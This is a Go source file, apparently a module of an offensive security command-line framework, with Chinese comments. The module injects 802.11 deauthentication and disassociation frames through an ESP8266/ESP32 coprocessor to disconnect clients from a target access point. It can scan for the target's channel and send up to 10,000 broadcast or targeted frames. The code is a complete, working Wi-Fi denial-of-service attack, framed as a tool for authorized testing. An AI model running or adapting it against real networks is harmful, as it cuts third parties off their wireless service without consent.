// wifi_deauth 模块通过 ESP 协处理器注入 deauth/disassoc 管理帧。
package wifi_deauth

import (
	"context"
	"fmt"
	"io"
	"net"
	"strings"
	"time"

	"github.com/ctkqiang/nezha_cli/internal/model"
	"github.com/ctkqiang/nezha_cli/internal/modulekit"
	"github.com/ctkqiang/nezha_cli/internal/netutil"
	"github.com/ctkqiang/nezha_cli/internal/wireless/esp"
	"github.com/ctkqiang/nezha_cli/internal/wireless/ieee80211"
	"github.com/ctkqiang/nezha_cli/pkg/logger"
)

const (
	// broadcastMAC 是广播接收方地址。
	broadcastMAC = "ff:ff:ff:ff:ff:ff"

	// maxFrames 是单次执行的最大注入帧数。
	maxFrames = 10000
)

// Module 是无线去认证模块。
type Module struct{}

/*
New 创建无线去认证模块实例。

参数:
  - 无。

返回:
  - model.Module: 模块实例。
*/
func New() model.Module {
	return &Module{}
}

/*
Meta 返回无线去认证模块的元数据。

参数:
  - 无。

返回:
  - model.Meta: 模块名称、类别、说明与参数声明。
*/
func (m *Module) Meta() model.Meta {
	return model.Meta{
		Name:     "wifi_deauth",
		Aliases:  []string{"deauth", "disassoc"},
		Category: modulekit.CategoryWireless,
		Summary:  "ESP 协处理器 deauth/disassoc 帧注入",
		Description: "通过 ESP8266/ESP32 协处理器向指定 BSSID 注入广播或定向的\n" +
			"deauthentication / disassociation 管理帧，用于授权范围内的无线健壮性测试。\n" +
			"影响等级高：会中断目标无线服务，仅限书面授权目标；\n" +
			"WPA3 与 6GHz 强制启用 PMF，未认证管理帧会被客户端丢弃，这是协议约束。\n" +
			"先用 wifi_scan 定位 BSSID 与信道，再执行本模块注入。",
		Usage: "use wifi_deauth\n" +
			"set BSSID AA:BB:CC:DD:EE:FF\n" +
			"set CHANNEL 6\n" +
			"run",
		Author: modulekit.Author,
		Impact: "高（会中断目标无线服务）",
		Options: []model.Option{
			modulekit.Option("PORT", "串口设备路径；留空时自动探测", false, ""),
			modulekit.Option("BSSID", "目标 AP 的 BSSID；格式 AA:BB:CC:DD:EE:FF，解析失败报错", true, ""),
			modulekit.Option("CHANNEL", "目标信道；0 表示先扫描定位目标所在信道", false, "0"),
			modulekit.Option("STATION", "目标客户端 MAC；留空或全 F 表示广播所有客户端", false, ""),
			modulekit.Option("FRAME", "注入帧类型；取值 deauth/disassoc/both", false, "both"),
			modulekit.Option("COUNT", "注入帧总数；范围 1-10000，超出报错", false, "32"),
			modulekit.Option("INTERVAL", "相邻帧间隔时长；不能为负数，0 表示不等待", false, "50ms"),
			modulekit.Option("REASON", "802.11 Reason Code；范围 1-65535，超出报错", false, "7"),
		},
		References: []string{
			"https://github.com/ctkqiang/NezhaCli",
			"https://docs.espressif.com/projects/esp-at/en/latest/",
			"https://en.wikipedia.org/wiki/Wi-Fi_Deauthentication_attack",
		},
	}
}

/*
Run 构造并注入管理帧。

参数:
  - ctx (context.Context): 执行上下文，Ctrl+C 时立即停止注入。
  - options (model.Options): 已合并默认值的模块参数。
  - out (io.Writer): 结果输出目标。

返回:
  - error: 参数非法、协处理器失败、信道定位失败或执行被取消时返回错误。
*/
func (m *Module) Run(ctx context.Context, options model.Options, out io.Writer) error {
	bssid, err := netutil.ParseMAC(options.Get("BSSID"))
	if err != nil {
		return err
	}

	station := net.HardwareAddr{0xff, 0xff, 0xff, 0xff, 0xff, 0xff}
	stationRaw := strings.TrimSpace(options.Get("STATION"))
	if stationRaw != "" && !strings.EqualFold(stationRaw, broadcastMAC) {
		station, err = netutil.ParseMAC(stationRaw)
		if err != nil {
			return err
		}
	}

	frameMode := strings.ToLower(options.String("FRAME", "both"))
	if frameMode != "deauth" && frameMode != "disassoc" && frameMode != "both" {
		return fmt.Errorf("FRAME 只能是 deauth、disassoc 或 both")
	}

	count := options.Int("COUNT", 32)
	if count < 1 || count > maxFrames {
		return fmt.Errorf("COUNT 需在 1-%d 之间", maxFrames)
	}
	interval := options.Duration("INTERVAL", 50*time.Millisecond)
	if interval < 0 {
		return fmt.Errorf("INTERVAL 不能为负数")
	}
	reasonValue := options.Int("REASON", 7)
	if reasonValue < 1 || reasonValue > 65535 {
		return fmt.Errorf("REASON 需在 1-65535 之间")
	}

	injector, err := esp.Open(options.Get("PORT"))
	if err != nil {
		return err
	}
	defer injector.Close()

	channel := options.Int("CHANNEL", 0)
	if channel == 0 {
		channel, err = locateChannel(injector, bssid.String())
		if err != nil {
			return err
		}
	}
	if err := injector.SetChannel(channel); err != nil {
		return err
	}

	frames, err := buildFrames(bssid, station, frameMode, uint16(reasonValue))
	if err != nil {
		return err
	}

	modulekit.Section(out, "注入配置")
	modulekit.KeyValues(out, [][2]string{
		{"串口", injector.PortName()},
		{"BSSID", bssid.String()},
		{"接收方", station.String()},
		{"信道", fmt.Sprintf("%d", channel)},
		{"帧类型", frameMode},
		{"帧数", fmt.Sprintf("%d", count)},
		{"间隔", interval.String()},
		{"Reason", fmt.Sprintf("%d", reasonValue)},
	}, 60)

	sent := 0
	started := time.Now()
	for index := 0; index < count; index++ {
		select {
		case <-ctx.Done():
			return ctx.Err()
		default:
		}

		if err := injector.Inject(frames[index%len(frames)]); err != nil {
			return fmt.Errorf("第 %d 帧注入失败: %w", sent+1, err)
		}
		sent++

		if interval == 0 || index == count-1 {
			continue
		}
		timer := time.NewTimer(interval)
		select {
		case <-ctx.Done():
			timer.Stop()
			return ctx.Err()
		case <-timer.C:
		}
	}

	modulekit.Section(out, "执行结果")
	modulekit.KeyValues(out, [][2]string{
		{"已发送", fmt.Sprintf("%d 帧", sent)},
		{"耗时", time.Since(started).Round(time.Millisecond).String()},
		{"信道", fmt.Sprintf("%d", channel)},
	}, 64)
	fmt.Fprintln(out, "提示：若目标启用了 802.11w/PMF（WPA3、6GHz），客户端会丢弃未认证管理帧。")
	logger.Info("去认证注入完成：%d 帧，信道 %d", sent, channel)
	return nil
}

/*
locateChannel 扫描周边 AP 并定位目标 BSSID 的信道。

参数:
  - injector (*esp.Injector): 已握手的协处理器。
  - bssid (string): 目标 BSSID。

返回:
  - int: 目标信道。
  - error: 扫描失败或未找到目标时返回错误。
*/
func locateChannel(injector *esp.Injector, bssid string) (int, error) {
	logger.Info("CHANNEL=0，先扫描定位 %s 的信道", bssid)
	networks, err := injector.Scan()
	if err != nil {
		return 0, err
	}
	for _, network := range networks {
		if strings.EqualFold(network.BSSID, bssid) {
			logger.Info("已定位目标：信道 %d，RSSI %d", network.Channel, network.RSSI)
			return network.Channel, nil
		}
	}
	return 0, fmt.Errorf("扫描结果中未找到 BSSID %s；请靠近目标或显式设置 CHANNEL", bssid)
}

/*
buildFrames 按帧类型构造注入帧集合。

参数:
  - bssid (net.HardwareAddr): 目标 AP 的 BSSID。
  - station (net.HardwareAddr): 接收方 MAC。
  - mode (string): deauth、disassoc 或 both。
  - reason (uint16): 802.11 Reason Code。

返回:
  - [][]byte: 注入帧集合。
  - error: 帧构造失败时返回错误。
*/
func buildFrames(bssid net.HardwareAddr, station net.HardwareAddr, mode string, reason uint16) ([][]byte, error) {
	deauth, err := ieee80211.BuildManagementFrame(bssid, station, ieee80211.SubtypeDeauth, reason)
	if err != nil {
		return nil, err
	}
	disassoc, err := ieee80211.BuildManagementFrame(bssid, station, ieee80211.SubtypeDisassoc, reason)
	if err != nil {
		return nil, err
	}

	switch mode {
	case "deauth":
		return [][]byte{deauth}, nil
	case "disassoc":
		return [][]byte{disassoc}, nil
	default:
		return [][]byte{deauth, disassoc}, nil
	}
}
